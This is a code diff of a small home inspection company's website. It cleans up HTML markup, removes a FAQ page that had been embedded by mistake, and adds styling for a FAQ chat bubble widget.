@@ -2,27 +2,25 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Prestige Inspections USA | Licensed Home Inspector NY</title>
-  <meta name="description" content="Licensed & certified home inspector serving the Tri-State Area, Orange & Sullivan Counties. Home inspections, sewer scope, and radon testing. 24-hour reports. Call (929) 210-3781." />
-  <meta name="keywords" content="home inspector New York, home inspection NY, sewer scope inspection, radon testing, licensed home inspector, Orange County NY, Sullivan County NY, Tri-State home inspector" />
-  <meta name="robots" content="index, follow" />
-  <link rel="canonical" href="https://prestigeinspectionsusa.com" />
+  <meta name="description" content="Licensed &amp; certified home inspector serving the Tri-State Area, Orange &amp; Sullivan Counties. Home inspections, sewer scope, and radon testing. 24-hour reports. Call (929) 210-3781.">
+  <meta name="keywords" content="home inspector New York, home inspection NY, sewer scope inspection, radon testing, licensed home inspector, Orange County NY, Sullivan County NY, Tri-State home inspector">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://prestigeinspectionsusa.com">
 
   <!-- Open Graph (looks good when shared on Facebook/WhatsApp) -->
-  <meta property="og:title" content="Prestige Inspections USA | Licensed Home Inspector NY" />
-  <meta property="og:description" content="Professional home inspections, sewer scope, and radon testing throughout New York and the Tri-State Area. 24-hour digital reports." />
-  <meta property="og:url" content="https://prestigeinspectionsusa.com" />
-  <meta property="og:type" content="website" />
-  <meta property="og:image" content="https://prestigeinspectionsusa.com/image.png" />
+  <meta property="og:title" content="Prestige Inspections USA | Licensed Home Inspector NY">
+  <meta property="og:description" content="Professional home inspections, sewer scope, and radon testing throughout New York and the Tri-State Area. 24-hour digital reports.">
+  <meta property="og:url" content="https://prestigeinspectionsusa.com">
+  <meta property="og:type" content="website">
+  <meta property="og:image" content="https://prestigeinspectionsusa.com/image.png">
 
-    <link rel="icon" href="p.png" type="image/png" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link
-        href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Open+Sans:wght@300;400;600&display=swap"
-        rel="stylesheet" />
+    <link rel="icon" href="p.png" type="image/png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&amp;family=Open+Sans:wght@300;400;600&amp;display=swap" rel="stylesheet">
     <style>
         *,
         *::before,
@@ -1335,8 +1333,168 @@
         height: 260px;
     }
 }
+
+        /* ─── FAQ CHAT BUBBLE WIDGET ─── */
+        #pi-chat-launcher {
+            position: fixed;
+            bottom: 22px;
+            right: 22px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: var(--blue);
+            border: none;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+            cursor: pointer;
+            z-index: 9998;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s ease;
+        }
+        #pi-chat-launcher:hover { transform: scale(1.06); }
+        #pi-chat-launcher svg { width: 26px; height: 26px; fill: var(--gold); }
+        #pi-chat-launcher .pi-chat-x { display: none; }
+        #pi-chat-launcher.open .pi-chat-bubble-icon { display: none; }
+        #pi-chat-launcher.open .pi-chat-x { display: block; }
+
+        #pi-chat-badge {
+            position: absolute;
+            top: -2px;
+            right: -2px;
+            background: var(--gold);
+            color: var(--blue);
+            font-size: 11px;
+            font-weight: 700;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        #pi-chat-panel {
+            position: fixed;
+            bottom: 96px;
+            right: 22px;
+            width: 340px;
+            max-width: calc(100vw - 32px);
+            height: 480px;
+            max-height: calc(100vh - 140px);
+            background: var(--white);
+            border-radius: 14px;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.22);
+            display: none;
+            flex-direction: column;
+            overflow: hidden;
+            z-index: 9999;
+            font-family: 'Open Sans', sans-serif;
+        }
+        #pi-chat-panel.open { display: flex; }
+
+        #pi-chat-header {
+            background: var(--blue);
+            color: #fff;
+            padding: 16px 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        #pi-chat-header .pi-chat-dot {
+            width: 9px; height: 9px; border-radius: 50%;
+            background: #3FCF7F; flex-shrink: 0;
+        }
+        #pi-chat-header .pi-chat-title { font-weight: 700; font-size: 15px; font-family: 'Poppins', sans-serif; }
+        #pi-chat-header .pi-chat-sub { font-size: 12px; color: rgba(255,255,255,0.7); }
+
+        #pi-chat-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            background: #F7F5F0;
+        }
+
+        .pi-chat-msg {
+            max-width: 84%;
+            padding: 10px 13px;
+            border-radius: 12px;
+            font-size: 13.5px;
+            line-height: 1.55;
+        }
+        .pi-chat-msg.bot {
+            background: #fff;
+            color: #26241F;
+            border: 1px solid #E5E1D4;
+            border-bottom-left-radius: 3px;
+            align-self: flex-start;
+        }
+        .pi-chat-msg.user {
+            background: var(--blue);
+            color: #fff;
+            border-bottom-right-radius: 3px;
+            align-self: flex-end;
+        }
+
+        #pi-chat-quick {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            padding: 0 16px 14px;
+            background: #F7F5F0;
+        }
+        .pi-chat-qbtn {
+            background: #fff;
+            border: 1px solid var(--gold);
+            color: var(--blue);
+            font-size: 13px;
+            font-weight: 600;
+            padding: 9px 12px;
+            border-radius: 20px;
+            text-align: left;
+            cursor: pointer;
+            transition: background 0.15s ease;
+            font-family: 'Open Sans', sans-serif;
+        }
+        .pi-chat-qbtn:hover { background: #FBF3E4; }
+        .pi-chat-qbtn.pi-chat-restart {
+            border-color: #DEDACE;
+            color: #6b6858;
+        }
+
+        #pi-chat-footer {
+            padding: 12px 16px;
+            border-top: 1px solid #E5E1D4;
+            display: flex;
+            gap: 8px;
+            background: #fff;
+        }
+        #pi-chat-footer a {
+            flex: 1;
+            text-align: center;
+            font-size: 12.5px;
+            font-weight: 600;
+            padding: 9px 6px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-family: 'Poppins', sans-serif;
+        }
+        #pi-chat-footer .pi-call { background: var(--gold); color: var(--blue); }
+        #pi-chat-footer .pi-wa { background: var(--blue); color: #fff; }
+
+        @media (max-width: 420px) {
+            #pi-chat-panel { right: 16px; bottom: 88px; width: calc(100vw - 32px); }
+            #pi-chat-launcher { right: 16px; bottom: 16px; }
+        }
     </style>
-</head>
+<style type="text/css" nonce="">
+.redacted {
+  color: red !important;
+}</style></head>
 
 <body>
 
@@ -1360,7 +1518,7 @@
     <header class="main-header">
         <div class="container">
             <div class="logo-area">
-                <a href="#" onclick="showPage('home');window.scrollTo(0,0);return false;"><img class="logo-icon" src="image.png" alt="Prestige Inspections USA" /></a>
+                <a href="#" onclick="showPage('home');window.scrollTo(0,0);return false;"><img class="logo-icon" src="image.png" alt="Prestige Inspections USA"></a>
             </div>
 
             <nav>
@@ -1388,22 +1546,21 @@
 
         <!-- HERO -->
         <section class="hero">
-            <svg class="hero-house" viewBox="0 0 800 500" fill="none" xmlns="http://www.w3.org/2000/svg"
-                aria-hidden="true">
-                <polygon points="400,40 720,200 720,480 80,480 80,200" fill="white" />
-                <rect x="150" y="280" width="120" height="200" fill="#0F2744" />
-                <rect x="320" y="280" width="160" height="200" fill="#0F2744" />
-                <rect x="530" y="280" width="120" height="200" fill="#0F2744" />
-                <rect x="160" y="295" width="45" height="45" fill="white" opacity="0.5" />
-                <rect x="220" y="295" width="45" height="45" fill="white" opacity="0.5" />
-                <rect x="160" y="355" width="45" height="45" fill="white" opacity="0.5" />
-                <rect x="220" y="355" width="45" height="45" fill="white" opacity="0.5" />
-                <rect x="380" y="330" width="40" height="150" fill="white" opacity="0.6" />
-                <rect x="540" y="295" width="45" height="45" fill="white" opacity="0.5" />
-                <rect x="600" y="295" width="45" height="45" fill="white" opacity="0.5" />
-                <rect x="540" y="355" width="45" height="45" fill="white" opacity="0.5" />
-                <rect x="600" y="355" width="45" height="45" fill="white" opacity="0.5" />
-                <polygon points="400,40 720,200 80,200" fill="#C8A96B" opacity="0.3" />
+            <svg class="hero-house" viewbox="0 0 800 500" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <polygon points="400,40 720,200 720,480 80,480 80,200" fill="white"></polygon>
+                <rect x="150" y="280" width="120" height="200" fill="#0F2744"></rect>
+                <rect x="320" y="280" width="160" height="200" fill="#0F2744"></rect>
+                <rect x="530" y="280" width="120" height="200" fill="#0F2744"></rect>
+                <rect x="160" y="295" width="45" height="45" fill="white" opacity="0.5"></rect>
+                <rect x="220" y="295" width="45" height="45" fill="white" opacity="0.5"></rect>
+                <rect x="160" y="355" width="45" height="45" fill="white" opacity="0.5"></rect>
+                <rect x="220" y="355" width="45" height="45" fill="white" opacity="0.5"></rect>
+                <rect x="380" y="330" width="40" height="150" fill="white" opacity="0.6"></rect>
+                <rect x="540" y="295" width="45" height="45" fill="white" opacity="0.5"></rect>
+                <rect x="600" y="295" width="45" height="45" fill="white" opacity="0.5"></rect>
+                <rect x="540" y="355" width="45" height="45" fill="white" opacity="0.5"></rect>
+                <rect x="600" y="355" width="45" height="45" fill="white" opacity="0.5"></rect>
+                <polygon points="400,40 720,200 80,200" fill="#C8A96B" opacity="0.3"></polygon>
             </svg>
 
             <div class="container">
@@ -1452,13 +1609,13 @@
                     <div class="card">
                         <div class="card-img card-bg-1">
                             <div class="card-img-overlay"></div>
-                         <img src="Home inspection main .jpeg" alt="Home Inspection" class="card-photo">
+                         <img src="Home%20inspection%20main%20.jpeg" alt="Home Inspection" class="card-photo">
                         </div>
                         <div class="card-body">
                             <h3>Home Inspections</h3>
                             <p>Comprehensive evaluations of major home systems and components to help buyers and
                                 homeowners make informed decisions.</p>
-                            <a href="#home-inspection" class="btn btn-primary" onclick="showPage('services');setTimeout(()=>document.getElementById('home-inspection').scrollIntoView(),100);return false;">Learn More</a>
+                            <a href="#home-inspection" class="btn btn-primary" onclick="showPage('services');setTimeout(()=&gt;document.getElementById('home-inspection').scrollIntoView(),100);return false;">Learn More</a>
                         </div>
                     </div>
 
@@ -1466,15 +1623,14 @@
                     <div class="card">
                         <div class="card-img card-bg-2">
                             <div class="card-img-overlay"></div>
-                            <img src="sewer main .jpeg" alt="Sewer Scope Inspection" class="card-photo">
+                            <img src="sewer%20main%20.jpeg" alt="Sewer Scope Inspection" class="card-photo">
                         </div>
                         <div class="card-body">
                             <h3>Sewer Scope Inspections</h3>
                             <p>Camera inspections of the main sewer line to identify hidden underground issues before
                                 they become costly repairs.</p>
                             <p class="card-note">⚠ Sewer repairs can exceed $10,000.</p>
-                            <a href="#sewer-scope" class="btn btn-primary" onclick="showPage('services');setTimeout(()=>document.getElementById('sewer-scope').scrollIntoView(),100);return false;">Learn More</a>
-                                More</a>
+                            <a href="#sewer-scope" class="btn btn-primary" onclick="showPage('services');setTimeout(()=&gt;document.getElementById('sewer-scope').scrollIntoView(),100);return false;">Learn More</a>
                         </div>
                     </div>
 
@@ -1482,13 +1638,13 @@
                     <div class="card">
                         <div class="card-img card-bg-3">
                             <div class="card-img-overlay"></div>
-                            <img src="radon main .jpeg" alt="Radon Testing" class="card-photo">
+                            <img src="radon%20main%20.jpeg" alt="Radon Testing" class="card-photo">
                         </div>
                         <div class="card-body">
                             <h3>Radon Testing</h3>
                             <p>Professional charcoal packet radon testing to help detect unsafe radon gas levels inside
                                 the home.</p>
-                            <a href="#radon-testing" class="btn btn-primary" onclick="showPage('services');setTimeout(()=>document.getElementById('radon-testing').scrollIntoView(),100);return false;">Learn More</a>
+                            <a href="#radon-testing" class="btn btn-primary" onclick="showPage('services');setTimeout(()=&gt;document.getElementById('radon-testing').scrollIntoView(),100);return false;">Learn More</a>
                         </div>
                     </div>
 
@@ -1583,8 +1739,7 @@
                                 <div class="contact-item-icon">✉</div>
                                 <div class="contact-item-text">
                                     <strong>Email</strong>
-                                    <a
-                                        href="mailto:Shimon@prestigeinspectionsusa.com">Shimon@prestigeinspectionsusa.com</a>
+                                    <a href="mailto:Shimon@prestigeinspectionsusa.com">Shimon@prestigeinspectionsusa.com</a>
                                 </div>
                             </div>
                             <div class="contact-item">
@@ -1600,28 +1755,26 @@
                     <div class="contact-form">
                         <h3>Send Us a Message</h3>
                         <form id="inquiryForm" onsubmit="submitForm(event)">
-                            <input type="hidden" name="access_key" value="bff4d305-46ef-4786-bce1-4b52661fe16a" />
-                            <input type="hidden" name="subject"
-                                value="New Inspection Inquiry — Prestige Inspections USA" />
-                            <input type="hidden" name="from_name" value="Prestige Inspections Website" />
+                            <input type="hidden" name="access_key" value="bff4d305-46ef-4786-bce1-4b52661fe16a">
+                            <input type="hidden" name="subject" value="New Inspection Inquiry — Prestige Inspections USA">
+                            <input type="hidden" name="from_name" value="Prestige Inspections Website">
                             <div class="form-row">
                                 <div class="form-group">
                                     <label for="fname">Name *</label>
-                                    <input type="text" id="fname" name="name" placeholder="Your full name" required />
+                                    <input type="text" id="fname" name="name" placeholder="Your full name" required>
                                 </div>
                                 <div class="form-group">
                                     <label for="fphone">Phone Number *</label>
-                                    <input type="tel" id="fphone" name="phone" placeholder="(555) 000-0000" required />
+                                    <input type="tel" id="fphone" name="phone" placeholder="(555) 000-0000" required>
                                 </div>
                             </div>
                             <div class="form-group">
                                 <label for="femail">Email Address *</label>
-                                <input type="email" id="femail" name="email" placeholder="you@example.com" required />
+                                <input type="email" id="femail" name="email" placeholder="you@example.com" required>
                             </div>
                             <div class="form-group">
                                 <label for="faddress">Property Address</label>
-                                <input type="text" id="faddress" name="address"
-                                    placeholder="123 Main St, New York, NY" />
+                                <input type="text" id="faddress" name="address" placeholder="123 Main St, New York, NY">
                             </div>
                             <div class="form-group">
                                 <label for="fservice">Service Needed</label>
@@ -1635,8 +1788,7 @@
                             </div>
                             <div class="form-group">
                                 <label for="fmessage">Message</label>
-                                <textarea id="fmessage" name="message"
-                                    placeholder="Tell us about your property or any questions you have..."></textarea>
+                                <textarea id="fmessage" name="message" placeholder="Tell us about your property or any questions you have..."></textarea>
                             </div>
                             <button type="submit" class="btn btn-primary">Submit Inquiry</button>
                         </form>
@@ -1685,8 +1837,7 @@
                             <li>Interior rooms &amp; finishes</li>
                             <li>Garage &amp; attached structures</li>
                         </ul>
-                        <a href="#" class="btn btn-primary"
-                            onclick="scrollToContact();showPage('home');return false;">Schedule a Home Inspection</a>
+                        <a href="#" class="btn btn-primary" onclick="scrollToContact();showPage('home');return false;">Schedule a Home Inspection</a>
                     </div>
                 </div>
             </div>
@@ -1718,8 +1869,7 @@
                             ⚠ Sewer line repairs can cost tens of thousands of dollars. A scope inspection is a small
                             investment that can prevent a massive surprise expense.
                         </div>
-                        <a href="#" class="btn btn-primary btn-mt"
-                            onclick="scrollToContact();showPage('home');return false;">Schedule a Sewer Scope</a>
+                        <a href="#" class="btn btn-primary btn-mt" onclick="scrollToContact();showPage('home');return false;">Schedule a Sewer Scope</a>
                     </div>
                 </div>
             </div>
@@ -1730,35 +1880,27 @@
             <div class="container">
                 <div class="service-layout">
                     <div class="service-visual">
-                        <svg viewBox="0 0 240 220" width="240" height="220" xmlns="http://www.w3.org/2000/svg"
-                            class="radon-svg" aria-label="Radon testing diagram">
-                            <rect x="0" y="155" width="240" height="65" fill="#5D4037" opacity="0.55" rx="3" />
-                            <rect x="0" y="145" width="240" height="16" fill="#795548" opacity="0.4" />
-                            <rect x="30" y="55" width="180" height="95" fill="none" stroke="white" stroke-width="2.5"
-                                opacity="0.55" rx="4" />
-                            <polyline points="15,58 120,14 225,58" fill="none" stroke="white" stroke-width="2.5"
-                                opacity="0.55" />
-                            <path d="M100,150 L120,115 L140,150" fill="none" stroke="#C8A96B" stroke-width="2.5" />
+                        <svg viewbox="0 0 240 220" width="240" height="220" xmlns="http://www.w3.org/2000/svg" class="radon-svg" aria-label="Radon testing diagram">
+                            <rect x="0" y="155" width="240" height="65" fill="#5D4037" opacity="0.55" rx="3"></rect>
+                            <rect x="0" y="145" width="240" height="16" fill="#795548" opacity="0.4"></rect>
+                            <rect x="30" y="55" width="180" height="95" fill="none" stroke="white" stroke-width="2.5" opacity="0.55" rx="4"></rect>
+                            <polyline points="15,58 120,14 225,58" fill="none" stroke="white" stroke-width="2.5" opacity="0.55"></polyline>
+                            <path d="M100,150 L120,115 L140,150" fill="none" stroke="#C8A96B" stroke-width="2.5"></path>
                             <g opacity="0.85">
-                                <line x1="65" y1="175" x2="65" y2="130" stroke="#C8A96B" stroke-width="2" />
-                                <polygon points="65,126 60,136 70,136" fill="#C8A96B" />
-                                <line x1="120" y1="165" x2="120" y2="108" stroke="#C8A96B" stroke-width="2" />
-                                <polygon points="120,104 115,114 125,114" fill="#C8A96B" />
-                                <line x1="175" y1="175" x2="175" y2="130" stroke="#C8A96B" stroke-width="2" />
-                                <polygon points="175,126 170,136 180,136" fill="#C8A96B" />
+                                <line x1="65" y1="175" x2="65" y2="130" stroke="#C8A96B" stroke-width="2"></line>
+                                <polygon points="65,126 60,136 70,136" fill="#C8A96B"></polygon>
+                                <line x1="120" y1="165" x2="120" y2="108" stroke="#C8A96B" stroke-width="2"></line>
+                                <polygon points="120,104 115,114 125,114" fill="#C8A96B"></polygon>
+                                <line x1="175" y1="175" x2="175" y2="130" stroke="#C8A96B" stroke-width="2"></line>
+                                <polygon points="175,126 170,136 180,136" fill="#C8A96B"></polygon>
                             </g>
-                            <rect x="140" y="75" width="48" height="58" fill="white" opacity="0.12" rx="6" />
-                            <rect x="145" y="80" width="38" height="48" fill="white" opacity="0.08" rx="4" />
-                            <text x="164" y="108" fill="white" font-size="11" text-anchor="middle"
-                                font-family="Poppins,sans-serif" font-weight="600">TEST</text>
-                            <text x="164" y="120" fill="#C8A96B" font-size="9" text-anchor="middle"
-                                font-family="sans-serif">DEVICE</text>
-                            <text x="65" y="210" fill="#C8A96B" font-size="9" font-family="sans-serif"
-                                text-anchor="middle">Rn</text>
-                            <text x="120" y="210" fill="#C8A96B" font-size="9" font-family="sans-serif"
-                                text-anchor="middle">Rn</text>
-                            <text x="175" y="210" fill="#C8A96B" font-size="9" font-family="sans-serif"
-                                text-anchor="middle">Rn</text>
+                            <rect x="140" y="75" width="48" height="58" fill="white" opacity="0.12" rx="6"></rect>
+                            <rect x="145" y="80" width="38" height="48" fill="white" opacity="0.08" rx="4"></rect>
+                            <text x="164" y="108" fill="white" font-size="11" text-anchor="middle" font-family="Poppins,sans-serif" font-weight="600">TEST</text>
+                            <text x="164" y="120" fill="#C8A96B" font-size="9" text-anchor="middle" font-family="sans-serif">DEVICE</text>
+                            <text x="65" y="210" fill="#C8A96B" font-size="9" font-family="sans-serif" text-anchor="middle">Rn</text>
+                            <text x="120" y="210" fill="#C8A96B" font-size="9" font-family="sans-serif" text-anchor="middle">Rn</text>
+                            <text x="175" y="210" fill="#C8A96B" font-size="9" font-family="sans-serif" text-anchor="middle">Rn</text>
                         </svg>
                     </div>
                     <div class="service-content">
@@ -1776,8 +1918,7 @@
                             <li>EPA action level guidance included</li>
                             <li>Fast turnaround on results</li>
                         </ul>
-                        <a href="#" class="btn btn-primary"
-                            onclick="scrollToContact();showPage('home');return false;">Schedule Radon Testing</a>
+                        <a href="#" class="btn btn-primary" onclick="scrollToContact();showPage('home');return false;">Schedule Radon Testing</a>
                     </div>
                 </div>
             </div>
@@ -1857,307 +1998,14 @@
         </div>
 
     </div><!-- /about page -->
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FAQ — Prestige Inspections USA</title>
-<style>
-  :root {
-    --navy: #1B2A41;
-    --slate: #3D5A73;
-    --gold: #C9922A;
-    --cream: #F7F5F0;
-    --ink: #26241F;
-    --line: #DEDACE;
-  }
 
-  * { box-sizing: border-box; }
-
-  .pi-faq {
-    background: var(--cream);
-    padding: 72px 20px 88px;
-    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-    color: var(--ink);
-  }
-
-  .pi-faq-inner {
-    max-width: 780px;
-    margin: 0 auto;
-  }
-
-  .pi-faq-eyebrow {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    justify-content: center;
-    font-size: 13px;
-    letter-spacing: 0.14em;
-    text-transform: uppercase;
-    color: var(--gold);
-    font-weight: 600;
-    margin-bottom: 14px;
-  }
-
-  .pi-faq-eyebrow::before,
-  .pi-faq-eyebrow::after {
-    content: "";
-    height: 1px;
-    width: 28px;
-    background: var(--gold);
-    opacity: 0.6;
-  }
-
-  .pi-faq h2 {
-    font-family: Georgia, 'Times New Roman', serif;
-    font-size: clamp(28px, 4vw, 40px);
-    text-align: center;
-    color: var(--navy);
-    margin: 0 0 12px;
-    line-height: 1.15;
-  }
-
-  .pi-faq-sub {
-    text-align: center;
-    color: var(--slate);
-    font-size: 16px;
-    max-width: 520px;
-    margin: 0 auto 48px;
-    line-height: 1.6;
-  }
-
-  .pi-faq-list {
-    border-top: 1px solid var(--line);
-  }
-
-  .pi-faq-item {
-    border-bottom: 1px solid var(--line);
-  }
-
-  .pi-faq-q {
-    width: 100%;
-    background: none;
-    border: none;
-    text-align: left;
-    padding: 22px 4px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    gap: 20px;
-    cursor: pointer;
-    font-family: inherit;
-    font-size: 17px;
-    font-weight: 600;
-    color: var(--navy);
-    -webkit-tap-highlight-color: transparent;
-  }
-
-  .pi-faq-q:hover { color: var(--slate); }
-
-  .pi-faq-mark {
-    flex-shrink: 0;
-    width: 26px;
-    height: 26px;
-    border-radius: 50%;
-    border: 1.5px solid var(--gold);
-    position: relative;
-    transition: transform 0.25s ease, background 0.25s ease;
-  }
-
-  .pi-faq-mark::before,
-  .pi-faq-mark::after {
-    content: "";
-    position: absolute;
-    background: var(--gold);
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-  }
-
-  .pi-faq-mark::before { width: 10px; height: 1.5px; }
-  .pi-faq-mark::after { width: 1.5px; height: 10px; transition: opacity 0.25s ease; }
-
-  .pi-faq-item[open] .pi-faq-mark { background: var(--gold); border-color: var(--gold); }
-  .pi-faq-item[open] .pi-faq-mark::before,
-  .pi-faq-item[open] .pi-faq-mark::after { background: var(--cream); }
-  .pi-faq-item[open] .pi-faq-mark::after { opacity: 0; }
-
-  .pi-faq-a {
-    padding: 0 4px 24px;
-    color: #4A473F;
-    font-size: 15.5px;
-    line-height: 1.7;
-    max-width: 660px;
-  }
-
-  .pi-faq-a p { margin: 0 0 12px; }
-  .pi-faq-a p:last-child { margin-bottom: 0; }
-
-  details.pi-faq-item summary { list-style: none; }
-  details.pi-faq-item summary::-webkit-details-marker { display: none; }
-
-  .pi-faq-cta {
-    margin-top: 56px;
-    text-align: center;
-    padding: 36px 24px;
-    background: var(--navy);
-    border-radius: 4px;
-  }
-
-  .pi-faq-cta p {
-    color: #EDE9DE;
-    font-size: 16px;
-    margin: 0 0 18px;
-  }
-
-  .pi-faq-cta-row {
-    display: flex;
-    gap: 12px;
-    justify-content: center;
-    flex-wrap: wrap;
-  }
-
-  .pi-faq-cta a {
-    display: inline-block;
-    padding: 12px 26px;
-    border-radius: 3px;
-    font-size: 14px;
-    font-weight: 600;
-    text-decoration: none;
-    letter-spacing: 0.02em;
-  }
-
-  .pi-faq-cta .pi-primary {
-    background: var(--gold);
-    color: var(--navy);
-  }
-
-  .pi-faq-cta .pi-secondary {
-    background: transparent;
-    color: #EDE9DE;
-    border: 1px solid rgba(237,233,222,0.4);
-  }
-
-  @media (max-width: 600px) {
-    .pi-faq { padding: 56px 16px 64px; }
-    .pi-faq-q { font-size: 16px; }
-  }
-</style>
-<style type="text/css" nonce="">
-.redacted {
-  color: red !important;
-}</style></head>
-<body>
-
-<section class="pi-faq">
-  <div class="pi-faq-inner">
-    <div class="pi-faq-eyebrow">Good to Know</div>
-    <h2>Frequently Asked Questions</h2>
-    <p class="pi-faq-sub">Straight answers about home inspections, sewer scope, and radon testing across the Tri-State Area, Orange &amp; Sullivan Counties.</p>
-
-    <div class="pi-faq-list">
-
-      <details class="pi-faq-item" open>
-        <summary class="pi-faq-q">What does a home inspection cover?<span class="pi-faq-mark"></span></summary>
-        <div class="pi-faq-a">
-          <p>A home inspection is a visual evaluation of the property's major systems and components — structure and foundation, roof and attic, electrical, plumbing, HVAC, windows, doors, exterior, interior finishes, and garage or attached structures. The goal is to give you a clear, honest picture of the home's condition before you buy, sell, or simply want peace of mind as an owner.</p>
-        </div>
-      </details>
-
-      <details class="pi-faq-item">
-        <summary class="pi-faq-q">How long does an inspection take?<span class="pi-faq-mark"></span></summary>
-        <div class="pi-faq-a">
-          <p>It depends on the size, age, and condition of the home, but most standard home inspections take a few hours on site. Sewer scope and radon testing can be added the same visit, which is convenient if you're coordinating a closing timeline.</p>
-        </div>
-      </details>
-
-      <details class="pi-faq-item">
-        <summary class="pi-faq-q">When will I get my report?<span class="pi-faq-mark"></span></summary>
-        <div class="pi-faq-a">
-          <p>You'll receive a detailed digital report within 24 hours of the inspection. It includes photos and clear written explanations for every item reviewed, so you and your agent can move forward with confidence.</p>
-        </div>
-      </details>
-
-      <details class="pi-faq-item">
-        <summary class="pi-faq-q">What is a sewer scope inspection, and do I really need one?<span class="pi-faq-mark"></span></summary>
-        <div class="pi-faq-a">
-          <p>A sewer scope inspection uses a waterproof camera fed through a cleanout access point to record the interior of the main sewer line, from the house to the municipal connection or septic system. It can reveal root intrusion, cracks, offset joints, corrosion, and blockages hidden underground.</p>
-          <p>It's optional, but worth serious consideration — sewer line repairs can run into the tens of thousands of dollars, and a scope inspection is a small investment compared to that kind of surprise.</p>
-        </div>
-      </details>
-
-      <details class="pi-faq-item">
-        <summary class="pi-faq-q">Why should I test for radon?<span class="pi-faq-mark"></span></summary>
-        <div class="pi-faq-a">
-          <p>Radon is an invisible, odorless gas that forms naturally in soil and rock and can seep into a home through foundation cracks and openings around pipes. Testing is the only way to know if it's present. We use professional charcoal packet testing, placed in the lowest livable area of the home, with lab-analyzed results. The EPA recommends mitigation at or above 4 pCi/L.</p>
-        </div>
-      </details>
-
-      <details class="pi-faq-item">
-        <summary class="pi-faq-q">How much does an inspection cost?<span class="pi-faq-mark"></span></summary>
-        <div class="pi-faq-a">
-          <p>Pricing depends on the size, age, and location of the property, along with which services you'd like combined — home inspection, sewer scope, radon testing, or a package of all three. Reach out with your property details and we'll give you an accurate quote, usually within the same day.</p>
-        </div>
-      </details>
-
-      <details class="pi-faq-item">
-        <summary class="pi-faq-q">Should I be there for the inspection?<span class="pi-faq-mark"></span></summary>
-        <div class="pi-faq-a">
-          <p>You're welcome to attend, and many clients find it helpful. Walking through findings in person, asking questions on the spot, and seeing issues firsthand often makes the written report easier to understand later. If your schedule doesn't allow it, the report itself is thorough enough to stand on its own.</p>
-        </div>
-      </details>
-
-      <details class="pi-faq-item">
-        <summary class="pi-faq-q">What if the inspection turns up problems?<span class="pi-faq-mark"></span></summary>
-        <div class="pi-faq-a">
-          <p>That's actually the point — better to know now than after closing. Every finding is documented clearly in the report with photos and explanations, so you can decide what matters most: negotiate repairs, request credits, or simply go in with realistic expectations about maintenance ahead. Questions about any finding are always welcome, before or after you've had time to review the report.</p>
-        </div>
-      </details>
-
-      <details class="pi-faq-item">
-        <summary class="pi-faq-q">What areas do you serve?<span class="pi-faq-mark"></span></summary>
-        <div class="pi-faq-a">
-          <p>We serve the Tri-State Area, with a focus on Orange and Sullivan Counties in New York. If you're just outside that footprint, reach out — service area can sometimes be flexible depending on scheduling.</p>
-        </div>
-      </details>
-
-      <details class="pi-faq-item">
-        <summary class="pi-faq-q">Are you licensed and certified?<span class="pi-faq-mark"></span></summary>
-        <div class="pi-faq-a">
-          <p>Yes. Prestige Inspections USA is fully licensed by New York State (License #16000156378) and certified through the ICA School. There's also a hands-on background in construction and related trades behind every inspection, which helps catch issues that go beyond a standard checklist.</p>
-        </div>
-      </details>
-
-      <details class="pi-faq-item">
-        <summary class="pi-faq-q">How do I schedule an inspection?<span class="pi-faq-mark"></span></summary>
-        <div class="pi-faq-a">
-          <p>The easiest way is to call or text (929) 210-3781, message on WhatsApp, or send an email with your property address and preferred timing. We'll confirm availability and walk you through next steps.</p>
-        </div>
-      </details>
-
-    </div>
-
-    <div class="pi-faq-cta">
-      <p>Have a question that isn't answered here?</p>
-      <div class="pi-faq-cta-row">
-        <a class="pi-primary" href="tel:9292103781">Call (929) 210-3781</a>
-        <a class="pi-secondary" href="https://wa.link/5H3MG7">Message on WhatsApp</a>
-      </div>
-    </div>
-
-  </div>
-</section>
-
-</body>
-</html>
     <!-- ─── FOOTER (SHARED) ─── -->
     <footer>
         <div class="container">
             <div class="footer-grid">
                 <div class="footer-brand">
                     <div class="logo-area">
-                        <a href="#" onclick="showPage('home');window.scrollTo(0,0);return false;"><img class="logo-icon-footer" src="image.png" alt="Prestige Inspections USA" /></a>
+                        <a href="#" onclick="showPage('home');window.scrollTo(0,0);return false;"><img class="logo-icon-footer" src="image.png" alt="Prestige Inspections USA"></a>
                     </div>
                     <p>Professional home inspections, sewer scope inspections, and radon testing throughout New York and
                         the Tri-State Area.</p>
@@ -2186,6 +2034,31 @@
             </div>
         </div>
     </footer>
+
+    <!-- ─── FAQ CHAT BUBBLE WIDGET ─── -->
+    <button id="pi-chat-launcher" onclick="piChatToggle()" aria-label="Open FAQ chat">
